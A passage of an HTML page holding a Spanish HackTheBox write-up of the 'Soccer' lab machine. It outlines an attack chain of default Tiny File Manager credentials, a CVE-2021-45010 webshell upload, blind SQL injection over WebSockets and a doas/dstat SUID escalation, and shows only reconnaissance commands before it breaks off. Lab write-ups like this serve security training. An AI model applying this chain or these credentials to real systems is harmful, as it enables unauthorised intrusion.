@@ -1,0 +1,1249 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Soccer — HackTheBox Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Soccer de HackTheBox — Dificultad: Fácil. Tiny File Manager RCE (CVE-2021-45010) → Blind SQLi vía WebSockets → doas + dstat → Root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00ff88;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --purple:    #bf5fff;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(0,255,136,0.07) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--cyan); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-facil   { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-htb     { color: var(--green);  border-color: rgba(0,255,136,0.3);  background: rgba(0,255,136,0.05); }
+    .badge-linux   { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
+    .badge-cve     { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
+    .badge-shell   { color: var(--cyan);   border-color: rgba(0,229,255,0.3);   background: rgba(0,229,255,0.05); }
+    .badge-sqli    { color: var(--purple); border-color: rgba(191,95,255,0.4);  background: rgba(191,95,255,0.05); }
+    .badge-nmap    { color: var(--orange); border-color: rgba(255,140,0,0.4);   background: rgba(255,140,0,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-cyan   { color: var(--cyan); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-facil  { color: #00ffcc; }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+    .prose p .hl-pur   { color: var(--purple); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,229,255,0.15);
+      border-left: 3px solid var(--cyan); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .prompt-root { color: var(--red); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+    .output-block .o-purple { color: var(--purple); }
+
+    /* INFO BOX */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    .cve-box { border: 1px solid rgba(255,45,85,0.3); background: rgba(255,45,85,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .cve-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--red); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .cve-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .cve-box p strong { color: var(--red); }
+
+    /* CRED BOX */
+    .cred-box { border: 1px solid rgba(0,255,136,0.25); background: rgba(0,255,136,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; display: flex; gap: 2rem; flex-wrap: wrap; }
+    .cred-item .cred-label { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 0.3rem; }
+    .cred-item .cred-val   { font-family: var(--font-mono); font-size: 0.95rem; color: var(--green); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--cyan); letter-spacing: 2px; border-bottom-color: rgba(0,229,255,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--green); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF SECTION */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,229,255,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* GLOSARIO */
+    .glosario-grid { display: grid; grid-template-columns: 1fr; gap: 1rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.4rem 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,229,255,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.88rem; color: var(--cyan); margin-bottom: 0.4rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.95rem; color: var(--text-dim); line-height: 1.75; }
+    .glos-def strong { color: var(--green); }
+    .glos-def code { color: var(--yellow); font-family: var(--font-mono); font-size: 0.85em; }
+
+    /* FOOTER */
+    footer { padding: 2rem 4rem; border-top: 1px solid var(--dim); display: flex; justify-content: space-between; align-items: center; margin-top: 4rem; }
+    footer p { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px; }
+    footer span { color: var(--green); }
+
+    @media (max-width: 960px) {
+      nav, .writeup-hero, footer { padding-left: 1.5rem; padding-right: 1.5rem; }
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/hackthebox/">hackthebox</a> /
+      <span>soccer</span>
+    </p>
+    <h1 class="writeup-title"><span>Soccer</span></h1>
+    <p class="writeup-subtitle">HackTheBox — Linux · Tiny File Manager RCE (CVE-2021-45010) → Blind SQLi vía WebSockets → doas + dstat → ROOT</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-cve">CVE-2021-45010</span>
+      <span class="meta-badge badge-sqli">BLIND SQLI</span>
+      <span class="meta-badge badge-shell">WEBSOCKETS</span>
+      <span class="meta-date">📅 Junio 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
+        <li><a href="#tfm">03 · Tiny File Manager</a></li>
+        <li><a href="#foothold">04 · Foothold (RCE)</a></li>
+        <li><a href="#pivote">05 · Pivote: vhost</a></li>
+        <li><a href="#sqli">06 · Blind SQLi (WS)</a></li>
+        <li><a href="#user">07 · Acceso como player</a></li>
+        <li><a href="#privesc">08 · Escalada a Root</a></li>
+        <li><a href="#flags">09 · Flags</a></li>
+        <li><a href="#referencia">10 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">11 · Glosario</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Ubuntu)</span></div>
+      <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.4.0</span></div>
+      <div class="info-row"><span class="info-label">CVE</span><span class="info-val val-red">CVE-2021-45010</span></div>
+      <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap</span> → puertos 22, 80</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Tiny File Manager</span> → creds por defecto</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>CVE-2021-45010</span> → RCE como www-data</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>nginx sites-available</span> → vhost soc-player</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>WebSocket /check</span> → Blind SQLi</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>soccer_db.accounts</span> → creds player</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>su player</span> → user.txt</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>doas.conf</span> → dstat sin password</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></div><div class="ap-text"><span style="color:var(--red)">dstat plugin evil.py</span> → ROOT</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- RESUMEN -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>Soccer</strong> es una máquina de dificultad <span class="hl">fácil</span> de la
+          plataforma <span class="hl-cyan">HackTheBox</span>, que combina mala configuración de
+          credenciales, un RCE conocido en una aplicación de gestión de archivos, e inyección SQL
+          ciega sobre un canal poco habitual: <strong>WebSockets</strong>.
+        </p>
+        <p>
+          El punto de entrada es <strong>Tiny File Manager v2.4.3</strong>, expuesto bajo
+          <span class="hl-cyan">/tiny/</span>, accesible con las <span class="hl">credenciales por
+          defecto</span> del proyecto. Esta versión es vulnerable a
+          <span class="hl-red">CVE-2021-45010</span>, que permite subir archivos arbitrarios —
+          en este caso, una webshell en PHP que entrega una <strong>reverse shell</strong> como
+          <span class="hl">www-data</span>.
+        </p>
+        <p>
+          Revisando la configuración de Nginx se descubre un <strong>vhost interno</strong>
+          (<span class="hl-cyan">soc-player.soccer.htb</span>) que expone un sitio de venta de
+          tickets. Su funcionalidad de verificación de tickets usa un <strong>WebSocket</strong>
+          vulnerable a <span class="hl-pur">blind SQL injection</span>, explotada con un script en
+          Python para extraer credenciales de la base de datos <code style="color:var(--yellow)">soccer_db</code>.
+          Esas credenciales se reutilizan para autenticarse como el usuario del sistema
+          <span class="hl">player</span>.
+        </p>
+        <p>
+          La escalada de privilegios aprovecha una regla mal configurada en
+          <span class="hl-cyan">doas</span> (alternativa a <code style="color:var(--yellow)">sudo</code>)
+          que permite ejecutar <code style="color:var(--yellow)">dstat</code> sin contraseña. Como
+          <code style="color:var(--yellow)">dstat</code> puede cargar plugins de Python arbitrarios,
+          se crea uno malicioso que otorga el bit <strong>SUID</strong> a <code style="color:var(--yellow)">/bin/bash</code>,
+          obteniendo una shell como <span class="hl-red">root</span>.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Escaneo</td><td>nmap -p- -sSCV --min-rate=5000 -oX</td><td>Puertos 22 (SSH) y 80 (HTTP) abiertos</td></tr>
+          <tr><td>Reporte</td><td>xsltproc soccer.xml</td><td>Reporte HTML visual del scan Nmap</td></tr>
+          <tr><td>Enum. Web</td><td>feroxbuster --url http://soccer.htb</td><td>Ruta /tiny/ — Tiny File Manager 2.4.3</td></tr>
+          <tr><td>Acceso inicial</td><td>Credenciales por defecto admin/admin@123</td><td>Acceso al explorador de archivos</td></tr>
+          <tr><td>RCE</td><td>CVE-2021-45010 — upload de webshell PHP</td><td>Reverse shell como www-data</td></tr>
+          <tr><td>Post-explot.</td><td>/etc/nginx/sites-available/soc-player.htb</td><td>vhost soc-player.soccer.htb descubierto</td></tr>
+          <tr><td>Enum. Web 2</td><td>feroxbuster soc-player.soccer.htb</td><td>Rutas /login, /signup, /check</td></tr>
+          <tr><td>Inyección</td><td>Blind SQLi vía WebSocket (puerto 9091)</td><td>Dump de soccer_db.accounts</td></tr>
+          <tr><td>Movimiento lateral</td><td>Password reuse — su player</td><td>Shell como player + user.txt</td></tr>
+          <tr><td>Enum. Privesc</td><td>find / -perm -4000 / doas.conf</td><td>doas permite dstat sin password</td></tr>
+          <tr><td>Privesc</td><td>Plugin malicioso dstat_evil.py (GTFOBins)</td><td>chmod +s /bin/bash</td></tr>
+          <tr><td>Root</td><td>/bin/bash -p</td><td>Shell como root + root.txt</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">ESCANEO DE PUERTOS CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se lanza un escaneo agresivo sobre todos los puertos, con detección de servicios y
+          versión (<span class="hl-cyan">-sSCV</span>), sin resolución DNS (<span class="hl-cyan">-n</span>),
+          sin ping previo (<span class="hl-cyan">-Pn</span>) y con una tasa mínima de paquetes
+          alta para acelerar el escaneo.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.4.0 -oX soccer.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p- -sSCV -n -Pn</span> <span class="flag">--min-rate=5000 --open</span> <span class="arg">10.129.4.0</span> <span class="flag">-oX</span> <span class="arg">soccer.xml</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PORT   STATE SERVICE VERSION</div>
+        <div><span class="o-green">22/tcp open  ssh</span>     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5</div>
+        <div><span class="o-green">80/tcp open  http</span>    nginx 1.18.0 (Ubuntu)</div>
+        <div>|_http-title: Did not follow redirect to <span class="o-cyan">http://soccer.htb/</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">REPORTE VISUAL Y RESOLUCIÓN DE DOMINIO</span>
+      </div>
+      <div class="prose">
+        <p>
+          El header <code style="color:var(--yellow)">http-title</code> revela que el servidor
+          redirige a <span class="hl-cyan">soccer.htb</span>. Se convierte el XML a HTML para una
+          lectura más cómoda y se agrega el dominio al <code style="color:var(--yellow)">/etc/hosts</code> local.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl soccer.xml > soccer.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">XSLTPROC</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">soccer.xml</span> &gt; <span class="arg">soccer.html</span></span></div>
+      </div>
+
+      <div class="cmd-block" data-cmd="echo '10.129.4.0    soccer.htb' | sudo tee -a /etc/hosts">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">HOSTS</span>
+        <div><span class="prompt">$ </span><span class="cmd">echo <span class="arg">'10.129.4.0    soccer.htb'</span> | sudo tee -a /etc/hosts</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- TINY FILE MANAGER -->
+    <div class="section" id="tfm">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Tiny File Manager</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">FUZZING DE DIRECTORIOS</span>
+      </div>
+      <div class="prose">
+        <p>Se fuzzea el sitio principal con Feroxbuster para descubrir rutas no enlazadas:</p>
+      </div>
+
+      <div class="cmd-block" data-cmd="feroxbuster --url http://soccer.htb">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">FEROXBUSTER</span>
+        <div><span class="prompt">$ </span><span class="cmd">feroxbuster <span class="flag">--url</span> <span class="arg">http://soccer.htb</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">200</span>      GET    http://soccer.htb/tiny/</div>
+        <div><span class="o-yellow">301</span>      GET    http://soccer.htb/tiny/uploads/</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">IDENTIFICACIÓN DE VERSIÓN</span>
+      </div>
+      <div class="prose">
+        <p>
+          <code style="color:var(--yellow)">/tiny/</code> expone el login de
+          <strong>Tiny File Manager</strong>. Revisando el código fuente de la página
+          (<span class="hl-cyan">view-source:</span>) se identifica la versión exacta del software.
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div>class="text-muted" data-<span class="o-yellow">version</span>="<span class="o-green">2.4.3</span>"&gt;CCP Programmers&lt;/a&gt;</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">CREDENCIALES POR DEFECTO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Tiny File Manager documenta públicamente sus credenciales por defecto en su propio
+          sitio (<a href="https://tinyfilemanager.github.io/" target="_blank" style="color:var(--cyan)">tinyfilemanager.github.io</a>).
+          Muchas instalaciones nunca las cambian.
+        </p>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item"><div class="cred-label">USUARIO</div><div class="cred-val">admin</div></div>
